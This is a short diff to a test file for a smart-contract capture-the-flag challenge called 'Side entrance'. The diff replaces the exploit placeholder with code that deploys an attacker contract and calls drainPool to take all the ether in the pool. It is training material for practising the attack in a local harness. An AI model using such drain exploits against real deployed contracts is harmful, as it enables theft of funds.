@@ -24,7 +24,10 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const AttackerProxySideFactory = await ethers.getContractFactory('AttackerProxySide', attacker);
+        this.attackerProxy = await AttackerProxySideFactory.deploy(this.pool.address);
+        await this.attackerProxy.drainPool({ value: ETHER_IN_POOL });
+
     });
 
     after(async function () {
